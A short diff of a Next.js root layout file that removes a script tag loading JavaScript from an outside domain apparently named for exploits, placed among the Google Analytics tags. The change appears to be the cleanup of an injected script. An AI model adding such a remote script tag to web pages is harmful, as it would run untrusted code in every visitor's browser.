@@ -79,8 +79,6 @@ export default function RootLayout({ children }) {
           src="https://www.googletagmanager.com/gtag/js?id=G-64QSGGL3N5"
         />
 
-        <script src="https://violentlinedexploit.com/c9/00/44/c90044a4242864685950f91240cbbb70.js"></script>
-
         <Script
           id="google-analytics"
           strategy="afterInteractive"
